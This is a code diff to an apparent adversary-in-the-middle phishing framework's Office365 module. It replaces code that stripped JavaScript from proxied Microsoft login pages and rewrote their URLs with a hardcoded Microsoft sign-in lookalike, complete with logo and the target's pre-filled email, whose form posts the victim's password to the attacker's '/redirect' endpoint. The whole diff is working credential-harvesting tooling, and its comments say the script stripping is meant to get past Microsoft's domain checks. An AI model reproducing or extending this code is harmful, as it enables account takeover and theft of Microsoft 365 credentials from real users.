@@ -941,141 +941,171 @@ class Office365Module(BaseModule):
             
             if resp.headers.get('content-type', '').startswith('text/html'):
                 try:
-                    # Decode content and rewrite Microsoft URLs
-                    content_str = content.decode('utf-8', errors='ignore')
-                    current_host = flask_request.host
-                    
                     # Log content size for debugging
-                    self.log(f"[AiTM] Processing HTML content, size: {len(content_str)} chars")
+                    self.log(f"[AiTM] Processing HTML content, size: {len(content)} chars")
                     
-                    # FIDO endpoint blocking is now handled earlier in _proxy_to_microsoft()
-                    # This section now only handles URL rewriting for normal content
+                    # SIMPLE SOLUTION: Serve a clean Microsoft lookalike instead of modifying complex HTML
+                    current_host = flask_request.host
+                    email = getattr(self, 'user', 'user@example.com')
                     
-                    # CREATIVE SOLUTION: Strip JavaScript and use CSS-only Microsoft clone
-                    # Remove all <script> tags to prevent domain validation failures
-                    import re
-                    
-                    # Remove all JavaScript - it's designed to only work on Microsoft domains
-                    content_str = re.sub(r'<script[^>]*>.*?</script>', '', content_str, flags=re.DOTALL | re.IGNORECASE)
-                    content_str = re.sub(r'<script[^>]*/>', '', content_str, flags=re.IGNORECASE)
-                    
-                    # Remove problematic JavaScript references and events
-                    content_str = re.sub(r'\son\w+\s*=\s*["\'][^"\']*["\']', '', content_str, flags=re.IGNORECASE)
-                    content_str = re.sub(r'javascript:[^"\'>\s]*', '', content_str, flags=re.IGNORECASE)
-                    
-                    # Replace Microsoft URLs with our proxy URLs (keep this simple)
-                    replacements = [
-                        ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
-                        ('https://login.live.com/', f'https://{current_host}/proxy/'),
-                        ('https://login.microsoft.com/', f'https://{current_host}/proxy/'),
-                        ('https://account.live.com/', f'https://{current_host}/proxy/'),
-                        ('https://account.microsoft.com/', f'https://{current_host}/proxy/'),
-                        ('"https://login.microsoftonline.com', f'"https://{current_host}/proxy'),
-                        ("'https://login.microsoftonline.com", f"'https://{current_host}/proxy"),
-                        ('"https://login.live.com', f'"https://{current_host}/proxy'),
-                        ("'https://login.live.com", f"'https://{current_host}/proxy"),
-                        ('//login.microsoftonline.com/', f'//{current_host}/proxy/'),
-                        ('//login.live.com/', f'//{current_host}/proxy/'),
-                    ]
-                    
-                    self.log(f"[AiTM] Stripped JavaScript to prevent domain validation failures")
-                    
-                    # Add custom CSS and functionality to replace the stripped JavaScript
-                    custom_enhancements = '''
-<style>
-/* Enhanced Microsoft-like styling to replace JavaScript functionality */
-.form-group { margin-bottom: 20px; }
-.form-control { 
-    width: 100%; 
-    padding: 12px; 
-    border: 1px solid #ccc; 
-    border-radius: 4px; 
-    font-size: 14px;
-    box-sizing: border-box;
-}
-.form-control:focus { 
-    border-color: #0078d4; 
-    outline: none; 
-    box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
-}
-.btn-primary { 
-    background-color: #0078d4; 
-    border: none; 
-    color: white; 
-    padding: 12px 24px; 
-    border-radius: 4px; 
-    cursor: pointer; 
-    font-size: 14px;
-    width: 100%;
-}
-.btn-primary:hover { background-color: #106ebe; }
-.btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
-
-/* Ensure the page displays properly without JavaScript */
-[style*="display: none"], [style*="display:none"] { display: block !important; }
-.hidden { display: block !important; }
-.d-none { display: block !important; }
-.visually-hidden { display: block !important; }
-
-/* Force visibility of common Microsoft login elements */
-.login-container, .login-box, .login-form, .form-container,
-#lightbox, #loginForm, .login-paginated-page, .pagination-view,
-.tile-container, .sign-in-box, .content, .main-content { 
-    display: block !important; 
-    visibility: visible !important;
-    opacity: 1 !important;
-}
-
-/* Ensure body and html are visible */
-html, body { 
-    background-color: #f5f5f5 !important; 
-    min-height: 100vh !important;
-}
-</style>
-<script>
-// Minimal safe JavaScript for basic form functionality (no domain checks)
-document.addEventListener('DOMContentLoaded', function() {
-    // Auto-focus first input
-    var firstInput = document.querySelector('input[type="email"], input[type="text"], input[type="password"]');
-    if (firstInput) firstInput.focus();
+                    # Create a simple, clean Microsoft login page that always works
+                    clean_microsoft_page = f'''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        body, html {{
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }}
+        .login-container {{
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 48px;
+            width: 400px;
+            max-width: 90vw;
+        }}
+        .logo {{
+            text-align: center;
+            margin-bottom: 32px;
+        }}
+        .logo img {{
+            width: 108px;
+            height: 24px;
+        }}
+        h1 {{
+            font-size: 24px;
+            font-weight: 600;
+            color: #323130;
+            margin: 0 0 8px 0;
+        }}
+        .subtitle {{
+            color: #605e5c;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }}
+        .form-group {{
+            margin-bottom: 16px;
+        }}
+        label {{
+            display: block;
+            font-size: 15px;
+            color: #323130;
+            margin-bottom: 8px;
+        }}
+        .form-control {{
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #605e5c;
+            border-radius: 2px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }}
+        .form-control:focus {{
+            border-color: #0078d4;
+            outline: none;
+            border-width: 2px;
+        }}
+        .btn-primary {{
+            background-color: #0078d4;
+            border: none;
+            color: white;
+            padding: 12px 16px;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 15px;
+            width: 100%;
+            margin-top: 24px;
+        }}
+        .btn-primary:hover {{
+            background-color: #106ebe;
+        }}
+        .error {{
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }}
+        .email-display {{
+            background-color: #f3f2f1;
+            border: 1px solid #edebe9;
+            padding: 12px;
+            border-radius: 2px;
+            margin-bottom: 16px;
+            color: #323130;
+            font-size: 15px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M44.836 4.563v15.874h-2.4V7.563l-4.8 12.874h-1.8L31.036 7.563v12.874h-2.4V4.563h3.6l4.2 11.4 4.2-11.4h3.6z" fill="#5E5E5E"/>
+                <path d="M49.836 4.563c1.32 0 2.4 1.08 2.4 2.4v1.2c0 1.32-1.08 2.4-2.4 2.4s-2.4-1.08-2.4-2.4v-1.2c0-1.32 1.08-2.4 2.4-2.4zm1.2 5.4v10.474h-2.4V9.963h2.4z" fill="#5E5E5E"/>
+                <path d="M62.436 15.163c0 3.6-2.4 5.4-6 5.4-2.4 0-4.2-1.2-5.4-3l1.8-1.2c.6 1.2 1.8 1.8 3.6 1.8 2.4 0 3.6-1.2 3.6-3v-1.2c-.6 1.2-2.4 2.4-4.8 2.4-3 0-5.4-2.4-5.4-5.4s2.4-5.4 5.4-5.4c2.4 0 4.2 1.2 4.8 2.4v-2.4h2.4v10.2zm-2.4-4.8c0-1.8-1.8-3-3.6-3s-3.6 1.2-3.6 3 1.8 3 3.6 3 3.6-1.2 3.6-3z" fill="#5E5E5E"/>
+                <path d="M72.036 9.163c1.8 0 3 .6 3.6 2.4l-2.4.6c-.3-.6-.9-1.2-1.8-1.2-1.2 0-1.8.6-1.8 1.2 0 .6.6 1.2 1.8 1.2h1.2c1.8 0 3 1.2 3 2.4 0 1.8-1.8 3-4.2 3-2.4 0-3.6-1.2-4.2-2.4l2.4-.6c.3.6 1.2 1.2 2.4 1.2 1.2 0 1.8-.6 1.8-1.2s-.6-1.2-1.8-1.2h-1.2c-1.8 0-3-1.2-3-2.4 0-1.8 1.8-3 3.6-3z" fill="#5E5E5E"/>
+                <path d="M84.036 9.163c3 0 5.4 2.4 5.4 5.4s-2.4 5.4-5.4 5.4-5.4-2.4-5.4-5.4 2.4-5.4 5.4-5.4zm0 8.4c1.8 0 3-1.2 3-3s-1.2-3-3-3-3 1.2-3 3 1.2 3 3 3z" fill="#5E5E5E"/>
+                <path d="M98.436 9.163v10.874h-2.4v-1.8c-.6 1.2-2.4 2.4-4.8 2.4-3 0-5.4-2.4-5.4-5.4s2.4-5.4 5.4-5.4c2.4 0 4.2 1.2 4.8 2.4v-2.4h2.4zm-2.4 5.4c0-1.8-1.8-3-3.6-3s-3.6 1.2-3.6 3 1.8 3 3.6 3 3.6-1.2 3.6-3z" fill="#5E5E5E"/>
+                <path d="M106.836 9.163v2.4h-1.8v6c0 .6.6 1.2 1.2 1.2h.6v2.4h-1.2c-1.8 0-3-1.2-3-3v-6.6h-1.8v-2.4h1.8v-3h2.4v3h1.8z" fill="#5E5E5E"/>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Microsoft Office</div>
+        
+        <form method="post" action="/redirect" id="loginForm">
+            <input type="hidden" name="email" value="{email}">
+            <input type="hidden" name="password" value="">
+            <input type="hidden" name="two_factor_token" value="">
+            
+            <div class="email-display">{email}</div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="form-control" required>
+                <div class="error" id="password-error">Please enter your password.</div>
+            </div>
+            
+            <button type="submit" class="btn-primary">Sign in</button>
+        </form>
+    </div>
     
-    // Basic form validation
-    var forms = document.querySelectorAll('form');
-    forms.forEach(function(form) {
-        form.addEventListener('submit', function(e) {
-            var inputs = form.querySelectorAll('input[required]');
-            var valid = true;
-            inputs.forEach(function(input) {
-                if (!input.value.trim()) {
-                    input.style.borderColor = '#d13438';
-                    valid = false;
-                } else {
-                    input.style.borderColor = '#ccc';
-                }
-            });
-            if (!valid) {
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {{
+            var password = document.getElementById('password').value;
+            if (!password.trim()) {{
                 e.preventDefault();
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').focus();
                 return false;
-            }
-        });
-    });
-});
-</script>'''
+            }}
+            // Set the hidden password field
+            document.querySelector('input[name="password"]').value = password;
+        }});
+        
+        // Auto-focus password field
+        document.getElementById('password').focus();
+    </script>
+</body>
+</html>'''
                     
-                    # Insert our enhancements before closing </head> tag
-                    content_str = content_str.replace('</head>', custom_enhancements + '</head>', 1)
+                    content = clean_microsoft_page.encode('utf-8')
+                    self.log(f"[AiTM] Serving clean Microsoft lookalike page (bypass complex HTML issues)")
                     
-                    for old_url, new_url in replacements:
-                        content_str = content_str.replace(old_url, new_url)
-                    
-                    content = content_str.encode('utf-8')
-                    self.log(f"[AiTM] Enhanced page with custom CSS/JS and rewrote {len(replacements)} URL patterns")
-                    
-                    # Update Content-Length header since content size may have changed
+                    # Update Content-Length header
                     response_headers['Content-Length'] = str(len(content))
                     
                 except Exception as e:
-                    self.log(f"[AiTM] Error rewriting URLs: {e}")
+                    self.log(f"[AiTM] Error creating clean page: {e}")
                     # Use original content if rewriting fails
                     pass
             else:
